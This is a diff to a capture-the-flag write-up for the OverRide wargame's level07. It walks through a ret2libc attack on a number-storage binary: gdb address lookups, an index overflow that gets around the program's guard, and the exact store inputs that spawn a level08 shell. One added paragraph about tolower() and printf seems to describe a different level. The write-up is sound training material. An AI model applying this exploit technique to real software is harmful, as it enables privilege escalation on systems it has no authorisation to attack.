@@ -44,6 +44,12 @@ Input command: store
 
 ### main() overview
 
+Let's take a deeper look at the program. See [dissasembly notes](https://github.com/anyashuka/Override/blob/main/level07/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.
+
+This program is a basic tolower(), which is of little interest to us.
+However we do see a call to printf(), which is vulnerable to string format exploits.
+We also see a call to exit().
+
 Protects Against:
 - arguments to the program
 - environment variables
@@ -61,6 +67,8 @@ Vulnerability: no check performed on the index and unsigned int table is stored 
 4) exploit by inputting malicious number + index to running program
 
 
+Let's do a ret2libc attack, by overwriting the EIP return address with a call to ```system()``` + ```exit()``` + ```"/bin/sh"```.
+First, we have to find those addresses. 
 ```
 level07@OverRide:~$ gdb -q level07
 
@@ -82,8 +90,13 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 (gdb) x/s 0xf7f897ec
 0xf7f897ec:	 "/bin/sh"
 ```
+Ok, here are our addresses:
 
-Find the EIP return address in the ```main()``` function. 
+- ```system()``` is at 0xf7e6aed0
+- ```exit()``` is at 0xf7e5eb70
+- ```"/bin/sh"``` is at 0xf7f897ec Note: we will flip these for little endian!
+
+Next, let's find the EIP return address in the ```main()``` function. 
 ```
 (gdb) info frame
 Stack level 0, frame at 0xffffd6c0:
@@ -104,7 +117,35 @@ We're going to write our payload at the address of EIP.
 
 ### Build exploit
 
+```
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
 
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+```
 
 ## Recreate Exploited Binary
 
